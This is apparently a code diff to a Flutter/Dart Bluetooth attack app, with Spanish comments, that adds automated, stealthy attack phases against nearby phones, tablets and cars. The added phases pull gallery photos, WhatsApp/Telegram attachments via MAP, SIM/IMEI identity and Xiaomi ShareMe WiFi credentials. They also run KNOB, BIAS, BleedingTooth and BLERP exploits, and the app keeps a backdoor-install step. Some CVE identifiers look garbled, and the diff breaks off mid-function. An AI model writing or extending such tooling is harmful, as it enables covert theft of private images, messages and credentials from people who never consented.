@@ -3,21 +3,24 @@
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
+import 'dart:math';
 import 'package:flutter/material.dart';
+import 'package:provider/provider.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:path_provider/path_provider.dart';
 import 'services/real_exploit_service.dart';
-import 'services/integrated_ai_service.dart';
+import 'services/heuristic_analysis_service.dart';
 import 'services/attack_suggestion_engine.dart';
 import 'services/permission_handler_service.dart';
 import 'widgets/smart_suggestion_panel.dart';
 import 'exploits/exploit_manager.dart';
 import 'utils/device_utils.dart' as device_utils;
 import 'file_browser_screen.dart';
-import 'ai/smart_recommendation_system.dart';
-import 'ai/success_optimizer.dart';
-import 'ai/ml_vulnerability_predictor.dart';
+import 'utils/smart_recommendation_system.dart';
+import 'utils/success_optimizer.dart';
+import 'advanced_systems/unified_advanced_system.dart';
+import 'providers/bluetooth_provider.dart';
 
 // ==================== PANTALLA DE PERMISOS ====================
 class PermissionScreen extends StatefulWidget {
@@ -152,7 +155,7 @@ class _PermissionScreenState extends State<PermissionScreen> {
                 const SizedBox(height: 40),
                 Container(
                   padding: const EdgeInsets.all(24),
-                  decoration: BoxDecoration(color: Colors.indigoAccent.withOpacity(0.1), shape: BoxShape.circle),
+                  decoration: BoxDecoration(color: Colors.indigoAccent.withValues(alpha: 0.1), shape: BoxShape.circle),
                   child: const Icon(Icons.shield_outlined, size: 64, color: Colors.indigoAccent),
                 ),
                 const SizedBox(height: 24),
@@ -213,7 +216,7 @@ class _PermissionScreenState extends State<PermissionScreen> {
   Widget _buildStatusCard() {
     return Container(
       padding: const EdgeInsets.all(16),
-      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.white.withOpacity(0.05))),
+      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.white.withValues(alpha: 0.05))),
       child: Row(
         children: [
           Icon(_bluetoothAvailable ? Icons.bluetooth_connected : Icons.bluetooth_disabled, color: _bluetoothAvailable ? Colors.greenAccent : Colors.redAccent),
@@ -238,7 +241,7 @@ class _PermissionScreenState extends State<PermissionScreen> {
     return Container(
       margin: const EdgeInsets.only(bottom: 12),
       padding: const EdgeInsets.all(16),
-      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: color.withOpacity(0.2))),
+      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: color.withValues(alpha: 0.2))),
       child: Row(
         children: [
           Icon(icon, color: color, size: 24),
@@ -253,12 +256,15 @@ class _PermissionScreenState extends State<PermissionScreen> {
 
 // ==================== PANTALLA PRINCIPAL ====================
 class UnifiedAttackScreen extends StatefulWidget {
-  const UnifiedAttackScreen({super.key});
+  final Map<String, dynamic>? initialDevice;
+
+  const UnifiedAttackScreen({super.key, this.initialDevice});
+
   @override
   State<UnifiedAttackScreen> createState() => _UnifiedAttackScreenState();
 }
 
-class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTickerProviderStateMixin {
+class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTickerProviderStateMixin, WidgetsBindingObserver {
   // ===== CONFIGURACIÓN DE ATAQUES (timeouts, reintentos) =====
   static const _defaultAttackTimeout = 10000; // 10s por defecto
   static const _defaultMaxRetries = 2;
@@ -315,8 +321,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       // BLE exploits
      'btlejack': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'blur_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
-     'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
-     'blueborne': {'timeout': 12000, 'retries': 2, 'delay': 2000},
+      'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
+      'blerp_attack': {'timeout': 12000, 'retries': 2, 'delay': 2000},
+      'blueborne': {'timeout': 12000, 'retries': 2, 'delay': 2000},
      'ble_pairing': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      'ble_exploit': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      'ble_replay': {'timeout': 12000, 'retries': 1, 'delay': 2000},
@@ -363,14 +370,35 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       'ghost_relay': {'timeout': 45000, 'retries': 1, 'delay': 3000},
       'bt_lateral_scan': {'timeout': 15000, 'retries': 1, 'delay': 2000},
       'bt_lateral_propagate': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+       // === EXTRACCIÓN DE IDENTIDAD Y SIM ===
+       'at_extract_identity': {'timeout': 25000, 'retries': 1, 'delay': 1500},
+       'sap_extract': {'timeout': 20000, 'retries': 1, 'delay': 1500},
+       // === EXTRACCIÓN DE GALERÍA ===
+       'extract_images': {'timeout': 60000, 'retries': 1, 'delay': 0},
+       // === MEDIASTORE MEJORADO (Android 10+) ===
+       'mediastore_enhanced': {'timeout': 20000, 'retries': 1, 'delay': 0},
+       // === GATT IMAGE READ (IoT/Cámaras BLE) ===
+       'gatt_image_read': {'timeout': 25000, 'retries': 1, 'delay': 0},
+       // === OPP SERVER MODE (invertir rol) ===
+       'opp_server_mode': {'timeout': 35000, 'retries': 1, 'delay': 0},
+        // === MAP IMAGE EXTRACT (WhatsApp/Telegram) ===
+         'map_image_extract': {'timeout': 20000, 'retries': 1, 'delay': 0},
+         'shareme_credential_extract': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+         'quickshare_discovery': {'timeout': 10000, 'retries': 1, 'delay': 1500},
+         // === Familias de capa de enlace (modernas) ===
+         'knob': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+         'cve_2021_10134_bias': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+         'cve_2020_26558_bleeding': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+         // === QUICK SHARE / NEARBY RECEPTOR (vía moderna de imágenes) ===
+         'quickshare_server': {'timeout': 40000, 'retries': 1, 'delay': 0},
     };
 
   final RealExploitService _exploitService = RealExploitService();
-  final IntegratedAIService _aiService = IntegratedAIService();
+  final HeuristicAnalysisService _heuristicEngine = HeuristicAnalysisService();
   final AttackSuggestionEngine _suggestionEngine = AttackSuggestionEngine();
   final SmartRecommendationSystem _smartRecommendation = SmartRecommendationSystem();
   final SuccessOptimizer _successOptimizer = SuccessOptimizer();
-  final MLVulnerabilityPredictor _mlVulnerabilityPredictor = MLVulnerabilityPredictor();
+  final UnifiedAdvancedSystem _advancedSystem = UnifiedAdvancedSystem();
   late TabController _tabController;
   StreamSubscription? _eventSubscription;
   final ScrollController _logScrollController = ScrollController();
@@ -387,6 +415,12 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   List<Map<String, dynamic>> _gattMirrorResults = []; // Resultados Mirror Profile
   List<Map<String, dynamic>> _fullScanResults = []; // Resultados Full Scan
   List<Map<String, dynamic>> _atInjectionResults = []; // Resultados AT Injection
+  Map<String, dynamic>? _identityExtractionResult; // Resultado AT identity/SAP/IMEI candidates
+  List<Map<String, dynamic>> _extractedImages = []; // Fotos extraídas de la galería del objetivo
+  List<Map<String, dynamic>> _mediastoreEnhanced = []; // Fotos vía MediaStore content:// URIs
+  List<Map<String, dynamic>> _gattImages = []; // Imágenes encontradas en GATT characteristics
+  List<Map<String, dynamic>> _oppReceivedImages = []; // Imágenes recibidas vía OPP server
+  List<Map<String, dynamic>> _mapImages = []; // Imágenes adjuntas de mensajes MAP
    int _activeAttackCount = 0; // Contador de ataques en paralelo
    bool get _isAttacking => _activeAttackCount > 0; // Getter para UI
   bool _isUnattendedRunning = false; // Modo desatendido activo
@@ -415,6 +449,14 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   bool _stealthMode = true;
   int _attackDelayMs = 1000;
   bool _maskDeviceIdentity = false;
+  final Random _stealthRng = Random.secure();
+
+  // Estados de sesión reanudable del modo automático.
+  bool _sessionResumable = false;
+  String _sessionDeviceAddress = '';
+  String _sessionDeviceName = '';
+  String _sessionDeviceType = '';
+  final Set<String> _sessionCompletedAttacks = {};
   
   // 4. Gestión de errores con backoff exponencial
   int _baseDelayMs = 1000;
@@ -462,9 +504,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   // Estado de configuración
   bool _enableParallelExecution = true;
   bool _enableAdaptiveIntelligence = true;
+  bool _enableAdvancedSystem = true;
   bool _enablePatternAnalysis = true;
   bool _enableNetworkAnalysis = true;
-   bool _enablePersistence = true;
+   bool _enablePersistence = false;
+  Map<String, dynamic> _advancedAttackResult = {};
 
   // Adaptive strategy selection
   String? _deviceFingerprint;
@@ -479,15 +523,15 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      final address = device['address'];
      final displayName = device_utils.getDeviceDisplayName(device);
 
-     // === Agrupar por fase ===
-     final Map<int, List<Map<String, dynamic>>> phases = {};
-     for (final t in techniques) {
-       final phase = (t['phase'] as int?) ?? 99; // Fase 99 = final/OPP
-       phases.putIfAbsent(phase, () => []).add(t);
-     }
+      // === Agrupar por fase ===
+      final Map<num, List<Map<String, dynamic>>> phases = {};
+      for (final t in techniques) {
+        final phase = (t['phase'] as num?) ?? 99; // Fase 99 = final/OPP
+        phases.putIfAbsent(phase, () => []).add(t);
+      }
 
-     // Ordenar fases ascendentes
-     final sortedPhases = phases.keys.toList()..sort();
+      // Ordenar fases ascendentes
+      final sortedPhases = phases.keys.toList()..sort();
 
      // === Ejecutar cada fase secuencialmente (fases no son paralelas entre sí) ===
      for (final phase in sortedPhases) {
@@ -496,14 +540,14 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
        _appendLog('📦 FASE $phase: ${phaseTechniques.length} ataques');
 
-       // Decidir si esta fase se ejecuta en paralelo o secuencial
-       // Fases de inyección (4), persistencia (7), OPP (99) → SIEMPRE secuenciales
-       final mustBeSequential = phase == 4 || phase == 7 || phase == 99;
+        // Decidir si esta fase se ejecuta en paralelo o secuencial
+        // Fases de inyección (4), persistencia (7), OPP (99), análisis profundo (8) → SIEMPRE secuenciales
+        final mustBeSequential = phase == 4 || phase == 7 || phase == 8 || phase == 99;
 
-       if (_enableParallelExecution && !mustBeSequential && phaseTechniques.length > 1) {
-         _appendLog('⚡ [PARALLEL] Fase $phase: ${phaseTechniques.length} ataques en paralelo (max 4 concurrentes)');
-         // Ejecutar en lotes de máximo 4 concurrentes para no saturar
-         const maxConcurrent = 4;
+        if (_enableParallelExecution && !mustBeSequential && phaseTechniques.length > 1) {
+          _appendLog('⚡ [PARALLEL] Fase $phase: ${phaseTechniques.length} ataques en paralelo (max 2 concurrentes)');
+          // Ejecutar en lotes de máximo 2 concurrentes para no saturar el pool nativo (4 hilos)
+          const maxConcurrent = 2;
          for (var i = 0; i < phaseTechniques.length; i += maxConcurrent) {
            if (!_isUnattendedRunning) break;
            final batch = phaseTechniques.skip(i).take(maxConcurrent).toList();
@@ -591,6 +635,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     // BLUR + SweynTooth (BLE 5.x modern exploits)
     {'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'cve': 'CVE-2022-20361', 'category': 'ble', 'desc': 'BLUR - BLE connection hijack'},
     {'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'cve': 'CVE-2019-17053', 'category': 'ble', 'desc': 'SweynTooth LLID injection'},
+    {'type': 'blerp_attack', 'name': 'BLERP_REPAIRING', 'cve': 'CVE-2025-62235', 'category': 'ble', 'desc': 'BLERP - BLE re-pairing MitM'},
+    {'type': 'shareme_credential_extract', 'name': 'SHAREME_CREDS', 'cve': '', 'category': 'ble', 'desc': 'Xiaomi ShareMe WiFi credential extraction'},
+    {'type': 'quickshare_discovery', 'name': 'QUICKSHARE_DISC', 'cve': '', 'category': 'recon', 'desc': 'Quick Share / AirDrop pre-auth discovery'},
     
     // ===== AVANZADOS/MODERNOS =====
     {'type': 'mirror_profile', 'name': 'MIRROR', 'cve': '', 'category': 'advanced', 'desc': 'Mirror Profile clone'},
@@ -633,6 +680,22 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      {'type': 'gatt_bulk_read', 'name': 'GATT_BULK', 'cve': '', 'category': 'ble', 'desc': 'Read all GATT characteristics'},
      {'type': 'gatt_monitor', 'name': 'GATT_MON', 'cve': '', 'category': 'ble', 'desc': 'Monitor GATT notifications'},
 
+     // ===== EXTRACCIÓN MODERNA DE IMÁGENES =====
+     // MediaStore Enhanced - Android 10+ content:// URIs (moderno, no OBEX)
+     {'type': 'mediastore_enhanced', 'name': 'MEDIASTORE_ENHANCED', 'cve': '', 'category': 'data_mediastore', 'desc': 'MediaStore batch: consulta content:// URIs, descarga todas las imágenes'},
+     // GATT Image Read - escanear characteristics BLE con datos de imagen
+     {'type': 'gatt_image_read', 'name': 'GATT_IMAGE_READ', 'cve': '', 'category': 'ble', 'desc': 'Escanear GATT characteristics buscando datos de imagen (IoT/cámaras)'},
+     // OPP Server Mode - invertir rol, target envía imágenes voluntariamente
+     {'type': 'opp_server_mode', 'name': 'OPP_SERVER_MODE', 'cve': '', 'category': 'data', 'desc': 'OPP Server: esperar que el target envíe imágenes vía Object Push'},
+     // MAP Image Extract - WhatsApp/Telegram images via MAP profile
+     {'type': 'map_image_extract', 'name': 'MAP_IMAGE_EXTRACT', 'cve': '', 'category': 'data', 'desc': 'MAP: extraer imógenes adjuntas de mensajes (WhatsApp/Telegram)'},
+      // ===== QUICK SHARE / NEARBY RECEPTOR (vía moderna de imágenes) =====
+      {'type': 'quickshare_server', 'name': 'QUICKSHARE_RECEPTOR', 'cve': '', 'category': 'data', 'desc': 'Quick Share server: recibe imágenes compartidas por el target (Nearby/Quick Share)'},
+      // ===== FAMILIAS DE CAPA DE ENLACE (modernas) =====
+      {'type': 'knob', 'name': 'KNOB', 'cve': 'CVE-2019-9506', 'category': 'ble', 'desc': 'KNOB - downgrade del tamaño de clave (7 bytes)'},
+      {'type': 'cve_2021_10134_bias', 'name': 'BIAS', 'cve': 'CVE-2021-10134', 'category': 'ble', 'desc': 'BIAS - impersonación de dispositivo durante pairing'},
+      {'type': 'cve_2020_26558_bleeding', 'name': 'BLEEDINGTOOTH', 'cve': 'CVE-2020-26558', 'category': 'ble', 'desc': 'BleedingTooth - fuga de heap L2CAP (Linux)'},
+
       // ===== PERSISTENCIA =====
      {'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'cve': '', 'category': 'persistence', 'desc': 'Install backdoor service'},
 
@@ -655,22 +718,37 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       final dt = deviceType.toLowerCase();
 
       final hasObex = deviceInfo['hasObex'] == true;
-      final hasAndroid = deviceInfo['androidVersion'] != null;
+      final hasAndroid = deviceInfo['androidVersion'] != null ||
+          dt.contains('smartphone') ||
+          dt.contains('tablet') ||
+          dt.contains('car');
       final isData = dt.contains('smartphone') || dt.contains('tablet') || dt.contains('laptop') || dt.contains('wearable') || dt.contains('car') || dt.contains('unknown');
       final isAudio = dt.contains('audio') || dt.contains('headset') || dt.contains('speaker') || dt.contains('earbud');
       final hasBle = deviceInfo['hasBle'] == true || dt.contains('wearable') || dt.contains('car');
       final shouldTryObex = hasObex || (isData && !isAudio);
 
-      // ========== FASE 1: RECONOCIMIENTO (paralelo) ==========
+      // ========== FASE 1: RECONOCIMIENTO (rápido, paralelo) ==========
       sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
       sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
-      sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
-      sequence.add({'type': 'cve_2025_13834_heartbleed', 'iterations': 20, 'name': 'HEARTBLEED_13834', 'phase': 1, 'timeout': 15000, 'retries': 2});
-      if (hasAndroid) {
-        sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
-        sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 1, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 1});
-        sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+
+      // ========== FASE 1: RECONOCIMIENTO (rápido, paralelo) ==========
+      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
+      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
+      sequence.add({'type': 'quickshare_discovery', 'name': 'QUICKSHARE_DISCOVERY', 'phase': 1, 'timeout': 10000, 'retries': 1});
+
+      // ========== FASE 1.5: EXTRACCIÓN DE IMÁGENES (PRIORIDAD MÁXIMA) ==========
+      if (dt.contains('smartphone') || dt.contains('tablet') || hasAndroid) {
+        sequence.add({'type': 'extract_images', 'name': 'GALLERY_PHOTOS', 'phase': 1.5, 'timeout': 60000, 'retries': 1});
+        if (hasAndroid) {
+          sequence.add({'type': 'mediastore_enhanced', 'name': 'MEDIASTORE_ENHANCED', 'phase': 1.5, 'timeout': 20000, 'retries': 1});
+        }
+        if (hasBle) {
+          sequence.add({'type': 'gatt_image_read', 'name': 'GATT_IMAGE_READ', 'phase': 1.5, 'timeout': 25000, 'retries': 1});
+        }
+        sequence.add({'type': 'opp_server_mode', 'name': 'OPP_SERVER_MODE', 'phase': 1.5, 'timeout': 35000, 'retries': 1});
+        sequence.add({'type': 'map_image_extract', 'name': 'MAP_IMAGE_EXTRACT', 'phase': 1.5, 'timeout': 20000, 'retries': 1});
+        // Receptor Quick Share / Nearby Connections: el target comparte y nosotros recibimos (Android moderno)
+        sequence.add({'type': 'quickshare_server', 'name': 'QUICKSHARE_RECEPTOR', 'phase': 1.5, 'timeout': 40000, 'retries': 1});
       }
 
       // ========== FASE 2: EXTRACCIÓN DE DATOS (paralelo) ==========
@@ -691,9 +769,22 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         }
       }
       if (isData) sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
+      sequence.add({'type': 'shareme_credential_extract', 'name': 'SHAREME_CREDENTIALS', 'phase': 2, 'timeout': 15000, 'retries': 2});
       if (dt.contains('smartphone') || dt.contains('tablet') || hasAndroid) {
+        sequence.add({'type': 'at_extract_identity', 'name': 'AT_IDENTITY', 'phase': 2, 'timeout': 25000, 'retries': 1});
         sequence.add({'type': 'map_extract', 'name': 'MAP_SMS_EXTRACT', 'phase': 2, 'timeout': 20000, 'retries': 2});
-        sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 1, 'timeout': 10000, 'retries': 1});
+        sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 2, 'timeout': 10000, 'retries': 1});
+      }
+
+      // ========== FASE 8: ANÁLISIS PROFUNDO (opcional, al final) ==========
+      // Técnicas pesadas que saturaban la fase 1 se ejecutan al final en secuencial
+      sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 8, 'timeout': 10000, 'retries': 1});
+      sequence.add({'type': 'cve_2025_13834_heartbleed', 'iterations': 5, 'name': 'HEARTBLEED_13834', 'phase': 8, 'timeout': 15000, 'retries': 1});
+      if (hasAndroid) {
+        sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 8, 'timeout': 8000, 'retries': 1});
+        sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 8, 'timeout': 15000, 'retries': 1});
+        sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 8, 'timeout': 10000, 'retries': 1});
+        sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 8, 'timeout': 8000, 'retries': 1});
       }
 
       // ========== FASE 3: BLE EXPLOITS (paralelo) ==========
@@ -706,6 +797,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
         sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
         sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        // === Familias de capa de enlace (modernas): KNOB, BIAS, BleedingTooth ===
+        sequence.add({'type': 'knob', 'name': 'KNOB_KEYSIZE_7', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'cve_2021_10134_bias', 'name': 'BIAS_IMPERSONATION', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'cve_2020_26558_bleeding', 'name': 'BLEEDINGTOOTH', 'phase': 3, 'timeout': 15000, 'retries': 2});
         sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
         sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
         sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
@@ -722,6 +817,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         sequence.add({'type': 'a2dp_record', 'duration': 30, 'name': 'A2DP_RECORD_30S', 'phase': 3, 'timeout': 35000, 'retries': 2});
         sequence.add({'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'phase': 3, 'timeout': 350000, 'retries': 1});
       }
+      sequence.add({'type': 'blerp_attack', 'name': 'BLERP_REPAIRING', 'phase': 3, 'timeout': 12000, 'retries': 2});
 
       // ========== FASE 4: INYECCIÓN (SECUENCIAL) ==========
       if (dt.contains('smartphone') || dt.contains('car') || hasAndroid) {
@@ -885,80 +981,38 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       try {
         final sdpResult = await _exploitService.sdpDiscover(address);
         if (sdpResult['success'] == true) {
-          info['services'] = sdpResult['services'] ?? [];
-          info['hasObex'] = (sdpResult['services'] as List?)?.any((s) =>
-              s.toString().toLowerCase().contains('obex') ||
-              s.toString().toLowerCase().contains('ftp')) ?? false;
-          info['hasBle'] = (sdpResult['services'] as List?)?.any((s) =>
-              s.toString().toLowerCase().contains('ble') ||
-              s.toString().toLowerCase().contains('gatt')) ?? false;
+          final services = (sdpResult['services'] as List?) ?? [];
+          info['services'] = services;
+
+          // Los servicios llegan como UUIDs completos (00001106-...); extraer el
+          // identificador corto y matchear contra perfiles OBEX/GATT conocidos.
+          // 'dynamic' (no 'Object') es requerido por map() para aceptar null.
+          String shortUuid(dynamic s) {
+            if (s is Map) {
+              final uuid = s['uuid']?.toString() ?? s['name']?.toString() ?? '';
+              return shortUuid(uuid);
+            }
+            final str = s.toString().toLowerCase();
+            final m = RegExp(r'^0000([0-9a-f]{4})-').firstMatch(str);
+            return m != null ? m.group(1)! : str;
+          }
+
+          final uuids = services.map(shortUuid).toSet();
+          // Perfiles que usan el transporte OBEX: OPP(1105), FTP(1106), IrMC(1107),
+          // SAP(112D), PBAP(112F/1130), MAP(1132/1133), BIP(1130/1150/1151)
+          const obexProfiles = {'1105', '1106', '1107', '112d', '112f', '1130', '1132', '1133', '1150', '1151'};
+          // GATT (1800/1801) y servicios estándar BLE (0x18xx)
+          info['hasObex'] = uuids.any(obexProfiles.contains);
+          info['hasBle'] = uuids.any((u) => RegExp(r'^(18|0?18)').hasMatch(u));
         }
       } catch (e) {}
 
-      // Infer capabilities from device name, type, and manufacturer
-      final device = _selectedDevice;
-      if (device != null) {
-        final deviceName = device_utils.getDeviceDisplayName(device);
-        final deviceType = _getDeviceType(device).toLowerCase();
-        final manufacturer = _getManufacturer(device['address'] ?? '');
-
-        // Check if it's an Android-type device (most support OBEX/BLE even if SDP silent)
-        final isAndroidByType = deviceType.contains('smartphone') ||
-            deviceType.contains('tablet') ||
-            deviceType.contains('laptop') ||
-            deviceType.contains('wearable') ||
-            deviceType.contains('car'); // Android Auto
-
-        final isAndroidByName = deviceName.contains('Android') ||
-            deviceName.contains('SM-') ||
-            deviceName.contains('Pixel') ||
-            deviceName.contains('Galaxy') ||
-            deviceName.contains('Note') ||
-            deviceName.contains('OnePlus') ||
-            deviceName.contains('Xiaomi') ||
-            deviceName.contains('Huawei') ||
-            deviceName.contains('Motorola') ||
-            deviceName.contains('LG-') ||
-            deviceName.contains('Sony') ||
-            deviceName.contains('HTC') ||
-            deviceName.contains('Nokia') ||
-            deviceName.contains('Oppo') ||
-            deviceName.contains('Vivo') ||
-            deviceName.contains('Realme');
-
-        final isAndroidByManufacturer = manufacturer == 'APPLE' && deviceName.contains('iPhone') == false ||
-            manufacturer == 'SAMSUNG' ||
-            manufacturer == 'GOOGLE' ||
-            manufacturer == 'XIAOMI' ||
-            manufacturer == 'HUAWEI' ||
-            manufacturer == 'OPPO' ||
-            manufacturer == 'VIVO' ||
-            manufacturer == 'NOKIA' ||
-            manufacturer == 'SONY' ||
-            manufacturer == 'LG' ||
-            manufacturer == 'MOTOROLA' ||
-            manufacturer == 'HTC';
-
-        final isLikelyAndroid = isAndroidByType || isAndroidByName || isAndroidByManufacturer;
-
-        if (isLikelyAndroid) {
-          info['androidVersion'] = 8; // default assumption
-          if (deviceName.contains('Pixel')) info['androidVersion'] = 10;
-          if (deviceName.contains('SM-G95') || deviceName.contains('SM-N95')) info['androidVersion'] = 9;
-          if (deviceName.contains('SM-A7') || deviceName.contains('SM-J7')) info['androidVersion'] = 10;
-          if (deviceName.contains('Galaxy S21') || deviceName.contains('Galaxy S22') || deviceName.contains('Galaxy S23')) info['androidVersion'] = 12;
-          // Most Android devices support OBEX and BLE even if SDP missed them
-          info['hasObex'] = true;
-          info['hasBle'] = true;
-        }
-
-        // Audio devices, beacons, pure peripherals typically don't have OBEX file storage
-        if (deviceType.contains('audio') || deviceType.contains('headset') || deviceType.contains('speaker')) {
-          info['hasObex'] = false;
-          info['hasBle'] = true; // Many modern audio devices have BLE
-        }
+      // Sin suposiciones fabricadas: si SDP no devolvió evidencia, las capacidades
+      // quedan como desconocidas (null) y el motor heurístico las trata como conservadoras.
+      final hasSdpEvidence = info['hasObex'] != null || info['hasBle'] != null;
+      if (!hasSdpEvidence) {
+        _appendLog('ℹ️ SDP sin evidencia de perfiles — capacidades tratadas como desconocidas');
       }
-
       return info;
     }
 
@@ -1101,21 +1155,21 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      }
    }
 
-  // Predicción de vulnerabilidades con IA (IntegratedAI + MLVulnerabilityPredictor)
+  // Predicción de vulnerabilidades por heurísticas (sin modelos TFLite)
   Future<Map<String, dynamic>> _predictVulnerabilities(String address) async {
     if (!_enableAdaptiveIntelligence || _selectedDevice == null) {
       return {};
     }
 
     try {
-      final mlPrediction = await _mlVulnerabilityPredictor.predict(
+      final prediction = await _heuristicEngine.assessVulnerabilities(
         address,
         _selectedDevice!,
       );
 
-      _appendLog('  🔬 ML: ${mlPrediction.cveCount} CVEs detectados (riesgo: ${mlPrediction.overallRiskLevel})');
+      _appendLog('  🔬 Heurística: ${prediction.cveCount} señales de vulnerabilidad (riesgo: ${prediction.overallRiskLevel})');
 
-      final aiAnalysis = await _aiService.runCompleteSecurityAnalysis(
+      final aiAnalysis = await _heuristicEngine.runCompleteSecurityAnalysis(
         deviceAddress: address,
         deviceData: _selectedDevice!,
       );
@@ -1127,11 +1181,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
       return {
         'ml_prediction': {
-          'cve_count': mlPrediction.cveCount,
-          'risk_level': mlPrediction.overallRiskLevel,
-          'risk_score': mlPrediction.overallRiskScore,
-          'recommended_action': mlPrediction.recommendedAction,
-          'vulnerabilities': mlPrediction.vulnerabilities.map((v) => {
+          'cve_count': prediction.cveCount,
+          'risk_level': prediction.overallRiskLevel,
+          'risk_score': prediction.overallRiskScore,
+          'recommended_action': prediction.recommendedAction,
+          'vulnerabilities': prediction.vulnerabilities.map((v) => {
             'id': v.id,
             'confidence': v.confidence,
             'type': v.type,
@@ -1156,32 +1210,55 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   // Modo sigiloso - ejecutar ataques con mínima detección
   Future<void> _executeStealthMode(String address, String displayName) async {
     if (!_stealthMode) return;
-    
-    _appendLog('  🎭 Ejecutando en modo SIGILOSO...');
-    
-    const stealthAttacks = [
-      {'type': 'sdp_discover', 'command': 'scan'},
-      {'type': 'file_exfil', 'command': 'scan'},
-      {'type': 'pbap_extract', 'command': 'contacts'},
-    ];
-    
-    for (final attack in stealthAttacks) {
-      if (!_isUnattendedRunning) return;
-      
-      try {
-        await Future.delayed(const Duration(milliseconds: 5000));
-        final result = await _exploitService.executeAttack(
-          deviceAddress: address,
-          type: attack['type'] as String,
-          command: attack['command'] as String?,
-        );
-        
-        if (result['success'] == true) {
